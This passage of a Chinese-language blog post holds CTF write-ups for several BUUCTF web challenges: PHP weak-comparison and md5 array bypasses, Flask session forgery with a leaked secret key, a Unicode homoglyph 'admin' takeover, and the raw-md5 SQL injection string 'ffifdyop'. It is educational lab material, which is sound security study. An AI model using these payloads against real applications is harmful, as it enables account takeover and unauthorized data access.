+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];    <span class="keyword">if</span>(!is_numeric(<span class="variable">$key</span>)) &#123;        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);    &#125;    <span class="variable">$key</span> = intval(<span class="variable">$key</span>);    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;        <span class="keyword">echo</span> <span class="variable">$flag</span>;    &#125;&#125;<span class="keyword">else</span> &#123;    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+<p>分析 1️⃣下，get 传递参数 key</p>
+<p>key 通过 is_numeric 判断是否为数字，再通过 intval 获取变量 key 的整数值</p>
+<p>最后如果变量 key==“123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3”，输出 flag</p>
+<p>ヾ (｡｀Д´｡) 干嘛干嘛呢这是，气人</p>
+<p>ლ(╹◡╹ლ) 好了，百度完回来了</p>
+<p>is_numeric ()，可以将字符串转换成 16 进制，绕过判断（经常造成 sql 注入）</p>
+<p>intval ()，获取变量的整数值，默认为十进制</p>
+<p>==，弱类型比较，当字符串和数字进行比较时，只提取字符串中开头的整数部分</p>
+<p>⭐然后突然发现 str 是以 123 开头，弱类型比较是等于 123 的</p>
+<p>好了 payload：?key=123，成功拿到 flag</p>
+<p>…(＿ ＿) ノ｜壁</p>
+<hr>
+<h2 id="hctf-2018-admin1"><a class="markdownIt-Anchor" href="#hctf-2018-admin1">#</a> HCTF 2018 admin1</h2>
+<p><em>关键字：flask，session 伪造，unicode 欺骗</em></p>
+<p>🦋登录和注册界面，看题 admin</p>
+<p>输入 admin/admin 登录失败</p>
+<p>注册 admin/admin 该账户已被注册</p>
+<p>🦋爆破⑧行，试了几个弱口令，我觉得留一个注册页面应该是用来注册的</p>
+<p>注册 admin123/admin123（弱口令老玩家٩◔̯◔۶ ）</p>
+<p>登录后回显（测了一遍并没有什么用）：</p>
+<p><img src="buuctf-web5.png" style="zoom:40%;" /><img src="buuctf-web6.png" style="zoom:40%;" /></p>
+<img src="buuctf-web4.png" style="zoom:22%;" />
+<p>🦋在 changepassword 中有一行被注释掉的提示信息</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://github.com/woadsl1234/hctf_flask/ --&gt;</span></span><br></pre></td></tr></table></figure>
+<p>flask 是一个微型的 python 开发的 web 框架</p>
+<p>然后发现是题目源码，但是.sql 文件中存储的 admin 密码是 hash 加密过的</p>
+<p>🎀对不起我只能想到构造 admin 的 session 登录 session 用户了</p>
+<p><img src="buuctf-web7.gif" alt="img"></p>
+<p>给当前登录用户的 session 解密如下：</p>
+<p><img src="buuctf-web7.png" alt=""></p>
+<p>可以看到当前登录用户是 admin123 辣</p>
+<p>index.html 界面会回显用户账户名，目测是根据 session 中的 name 回显的，查看源代码中的 index.html 文件：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;% include(<span class="string">&#x27;header.html&#x27;</span>) %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> current_user.is_authenticated %&#125;</span><br><span class="line">&lt;h1 <span class="class"><span class="keyword">class</span>=&quot;<span class="title">nav</span>&quot;&gt;<span class="title">Hello</span> &#123;&#123; <span class="title">session</span>[&#x27;<span class="title">name</span>&#x27;] &#125;&#125;&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">&#123;% <span class="title">endif</span> %&#125;</span></span><br><span class="line"><span class="class">&#123;% <span class="title">if</span> <span class="title">current_user</span>.<span class="title">is_authenticated</span> <span class="title">and</span> <span class="title">session</span>[&#x27;<span class="title">name</span>&#x27;] == &#x27;<span class="title">admin</span>&#x27; %&#125;</span></span><br><span class="line"><span class="class">&lt;<span class="title">h1</span> <span class="title">class</span>=&quot;<span class="title">nav</span>&quot;&gt;<span class="title">hctf</span>&#123;<span class="title">xxxxxxxxx</span>&#125;&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">&#123;% <span class="title">endif</span> %&#125;</span></span><br><span class="line"><span class="class">&lt;!-- <span class="title">you</span> <span class="title">are</span> <span class="title">not</span> <span class="title">admin</span> --&gt;</span></span><br><span class="line"><span class="class">&lt;h1 <span class="keyword">class</span>=&quot;nav&quot;&gt;Welcome to hctf&lt;/h1&gt;</span></span><br><span class="line"><span class="class">&#123;% include(&#x27;footer.html&#x27;) %&#125;</span></span><br></pre></td></tr></table></figure>
+<p xxxxxxxxx="">当 session 中的 name=admin 时，会输出 flaghctf</p>
+<p>但是 flask session 加密需要秘钥，在 config.py 中找到 SECRET_KEY=os.environ.get (‘SECRET_KEY’) or ‘ckj123’</p>
+<p><img src="buuctf-web11.png" alt="buuctf-web11"></p>
+<p>利用<a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager"> flask_session 加解密工具</a>进行 session 加解密</p>
+<p>将以下数据加密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;22ef025f1846ed290c3abc33091af4789157e04648638256aa7b8d41e4e27adfa91e24e72c43d5d81353bd327192646b54ca6b77e66626aab5f3d7521feba4ef&#x27;, &#x27;csrf_token&#x27;: b&#x27;62c673754392025e9b7ce0ec4fe937415e76df71&#x27;, &#x27;image&#x27;: b&#x27;wlBG&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="buuctf-web8.png" alt=""></p>
+<p>拿到 flag，好耶ヾ (✿ﾟ▽ﾟ) ノ</p>
+<p>🎀再来撸一下<a target="_blank" rel="noopener" href="http://xdxd.love/2016/10/17/unicode%E5%90%8C%E5%BD%A2%E5%AD%97%E5%BC%95%E8%B5%B7%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"> unicode 同形字引起的安全问题</a></p>
+<p>在这里 <code>Twisted库的版本是10.0.0</code></p>
+<p>nodeprep.prepare () 函数，第一次调用：会把其他类的编码转为 ascii 码，第二次调用：内容转为小写</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ᴬᴰᴹᴵᴺ —&gt; ADMIN —&gt; admin</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="http://xn--rutes-ck2hx70mgflissmgc.py">查看源代码 rutes.py</a>，自定义一个转小写函数：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span>(<span class="params">username</span>):</span>    username = nodeprep.prepare(username)    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure>
+<p>在三个功能点处都调用过一次该函数：register、login、change</p>
+<p>在登录时，会调用 strlower ()，将ᴬᴰᴹᴵᴺ 转成 ADMIN，存储在 session 中</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:        name = strlower(form.username.data)        session[<span class="string">&#x27;name&#x27;</span>] = name</span><br></pre></td></tr></table></figure>
+<p>因此，我们注册一个账户名为ᴬᴰᴹᴵᴺ的用户，登录后欢迎界面会显示 ADMIN</p>
+<img src="buuctf-web9.png" style="zoom:50%;" />
+<p>修改密码时，同样会再次调用 strlower ()，将 ADMIN 转成 admin，存储在 session 中</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:        name = strlower(session[<span class="string">&#x27;name&#x27;</span>])        user = User.query.filter_by(username=name).first()        user.set_password(form.newpassword.data)        db.session.commit()        flash(<span class="string">&#x27;change successful&#x27;</span>)        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br></pre></td></tr></table></figure>
+<p>因此此时我们修改的密码为 admin 的密码</p>
+<p>然后嚯嚯嚯拿到 flag ヾ (･ω･`｡)</p>
+<p>🎀大失败</p>
+<p>因为登录时，是先写入 session，再判断该账户是否登录成功</p>
+<p>改密码时，需要获取 session，再进行密码修改</p>
+<p>因此在登录写入 session 之后，判断用户是否登录成功销毁 session 之前，此时修改密码，就可以成功修改登录用户的密码</p>
+<p>但是我没有看见 login 处登录失败时，会销毁 session</p>
+<p>🐴所以先在火狐上登录一个随便注册的账号，打开更改密码界面</p>
+<p>🐴再在谷歌上登录 admin 账号（随便输入密码）</p>
+<p>🐴最后修改密码</p>
+<p>用修改的密码登录 admin 账号失败</p>
+<p><strong>参考链接：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44677409/article/details/100733581">此题三种解法</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/278d4f59839d">flask session</a></p>
+<p><a target="_blank" rel="noopener" href="https://chenlvtang.github.io/2020/05/14/Unicode%E5%B0%8F%E9%AA%97%E5%AD%90/#%E4%B8%BE%E4%B8%AA%F0%9F%8C%B0-HCTF2018-admin">Unicode 小骗子</a></p>
+<p>php 弱类型比较表</p>
+<p><img src="buuctf-web10.png" alt=""></p>
+<hr>
+<h2 id="极客大挑战-2019-buyflag"><a class="markdownIt-Anchor" href="#极客大挑战-2019-buyflag">#</a> 极客大挑战 2019 BuyFlag</h2>
+<p><em>关键词：php、strcmp () 绕过</em></p>
+<p>🎀查看 pay.php 源码，发现提示</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">~~~post money <span class="keyword">and</span> password~~~<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (is_numeric(<span class="variable">$password</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;			&#125;<span class="keyword">elseif</span> (<span class="variable">$password</span> == <span class="number">404</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Password Right!&lt;/br&gt;&quot;</span>;	</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>password 弱比较，password=404a</p>
+<p>🎀根据 Flag need your 100000000 money，可以使用科学计数法 1e9，也可以通过<a target="_blank" rel="noopener" href="https://blog.csdn.net/cherrie007/article/details/77473817"> strcmp 漏洞</a>，进行绕过</p>
+<p>money []=a 或者 money=1e9 都可以</p>
+<p>🎀根据 You must be a student from CUIT，大概率是在 cookie 处验证身份信息</p>
+<p>发现 cookie 处有一个 user=0，改成 user=1 即可通过验证</p>
+<hr>
+<h2 id="bjdctf2020-easy-md5"><a class="markdownIt-Anchor" href="#bjdctf2020-easy-md5">#</a> BJDCTF2020 Easy MD5</h2>
+<p><em>关键词：php、md5 () 绕过</em></p>
+<p>抓包看见响应包中的提示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hint: select * from &#x27;admin&#x27; where password=md5($pass,true)</span><br></pre></td></tr></table></figure>
+<p>看题如果正常 md5 加密 pass 这个逻辑，肯定注不进去哇</p>
+<p>辣就去找关于 md5 () 这个函数的漏洞</p>
+<blockquote>
+<p>语法：md5 (string,raw)</p>
+<p><strong>string</strong>: 所需加密的字符串</p>
+<p><strong>raw</strong>: 可选参数 TRUE 或 FALSE。FALSE（默认，32 字符十六进制数）；TRUE（原始 16 字符二进制格式）</p>
+</blockquote>
+<p>也就是说当第二个参数为 true 时，返回的是原始 16 字符二进制格式的散列值，会被当做 ascii 码字符串处理（？）</p>
+<p>⭐原始二进制数据指原始字符串转换成 ascii 码后组成的字符串</p>
+<p>所以只需要找到一个 str，经过 md5 (str, true) 加密后，再转成 ascii 码字符串，包含我们需要注入的字符即可</p>
+<p>看 sql 语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from &#x27;admin&#x27; where password=md5($pass,true)</span><br></pre></td></tr></table></figure>
+<p>将 where 后的条件恒为真时，我们就可获取 admin 表中的所有数据</p>
+<p>🐴能用的字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content: 129581926211651571912466741651878684928hex: 06da5430449f8f6f23dfc1276f722738raw: \x06\xdaT0D\x9f\x8fo#\xdf\xc1&#x27;or&#x27;8string: T0Do#&#x27;or&#x27;8content: ffifdyophex: 276f722736c95d99e921722cf9ed621craw: &#x27;or&#x27;6\xc9]\x99\xe9!r,\xf9\xedb\x1cstring: &#x27;or&#x27;6]!r,b</span><br></pre></td></tr></table></figure>
+<p>当且仅当 or 后字符串开头字符为 0 时，返回 false</p>
+<p>输入 payload，跳转至 levels91.php，源码中包含提示：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="variable">$GET</span>[<span class="string">&#x27;a&#x27;</span>];<span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];<span class="keyword">if</span>(<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; md5(<span class="variable">$a</span>) == md5(<span class="variable">$b</span>))&#123;    <span class="comment">// wow, glzjin wants a girl friend.</span></span><br></pre></td></tr></table></figure>
+<p>当字符串 a，b 不相等，md5 加密后的字符串相等后，进入 if 中没有放出来的代码</p>
+<p>⭐5️⃣⑧訾 Dao の 4：md5 () 或者 sha1 () 之类的函数计算的是一个字符串的哈希值，对于数组则返回 false，如果<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mtext>和</mtext></mrow><annotation encoding="application/x-tex">a和</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mord cjk_fallback">和</span></span></span></span> b 都是数组则双双返回 FALSE, 两个 FALSE 相等得以绕过</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a[]=111&amp;b[]=www</span><br></pre></td></tr></table></figure>
+<p>跳转至 levell14.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>error_reporting(<span class="number">0</span>);<span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;highlight_file(<span class="keyword">__FILE__</span>);<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;md5(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>])===md5(<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]))&#123;    <span class="keyword">echo</span> <span class="variable">$flag</span>;&#125; </span><br></pre></td></tr></table></figure>
+<p>payload (POST 请求):</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1[]=1&amp;param2[]=2</span><br></pre></td></tr></table></figure>
+<p>一样の zsd</p>
+<p><strong>参考链接</strong></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/iczfy585/article/details/106081299">PHP 中 md5 常见绕过</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_string_md5.asp">PHP_md5 函数</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.7gugu.com/2020/01/15/%E6%8E%A2%E7%A9%B6php%E7%9A%84md5%E5%87%BD%E6%95%B0%E8%BE%93%E5%87%BA%E7%9A%84%E5%8E%9F%E5%A7%8B%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%95%B0%E6%8D%AE%E6%98%AF%E5%95%A5/">探究 php 的 MD5 函数输出的原始二进制数据是啥？</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12304899.html">哒暗</a></p>
+<hr>
+<p>未完待续…</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-upload"><span class="toc-number">1.</span> <span class="toc-text"> 极客大挑战 2019 upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-php"><span class="toc-number">2.</span> <span class="toc-text"> 极客大挑战 2019 php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#actf2020-%E6%96%B0%E7%94%9F%E8%B5%9B-upload1"><span class="toc-number">3.</span> <span class="toc-text"> ACTF2020 新生赛 Upload1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-babysql1"><span class="toc-number">4.</span> <span class="toc-text"> 极客大挑战 2019 BabySQL1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#actf2020-%E6%96%B0%E7%94%9F%E8%B5%9B-backupfile1"><span class="toc-number">5.</span> <span class="toc-text"> ACTF2020 新生赛 BackupFile1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#actf2020-%E6%96%B0%E7%94%9F%E8%B5%9B-backupfile1-2"><span class="toc-number">6.</span> <span class="toc-text"> ACTF2020 新生赛 BackupFile1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hctf-2018-admin1"><span class="toc-number">7.</span> <span class="toc-text"> HCTF 2018 admin1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-buyflag"><span class="toc-number">8.</span> <span class="toc-text"> 极客大挑战 2019 BuyFlag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bjdctf2020-easy-md5"><span class="toc-number">9.</span> <span class="toc-text"> BJDCTF2020 Easy MD5</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/06/29/dmx/buuctf-web/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/06/29/dmx/buuctf-web/&text=Buuctf-web 武林秘籍"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/06/29/dmx/buuctf-web/&title=Buuctf-web 武林秘籍"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/06/29/dmx/buuctf-web/&is_video=false&description=Buuctf-web 武林秘籍"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Buuctf-web 武林秘籍&body=Check out this article: http://example.com/2021/06/29/dmx/buuctf-web/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/06/29/dmx/buuctf-web/&title=Buuctf-web 武林秘籍"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/06/29/dmx/buuctf-web/&title=Buuctf-web 武林秘籍"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/06/29/dmx/buuctf-web/&title=Buuctf-web 武林秘籍"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/06/29/dmx/buuctf-web/&title=Buuctf-web 武林秘籍"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/06/29/dmx/buuctf-web/&name=Buuctf-web 武林秘籍&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/06/29/dmx/buuctf-web/&t=Buuctf-web 武林秘籍"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2022
+    John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
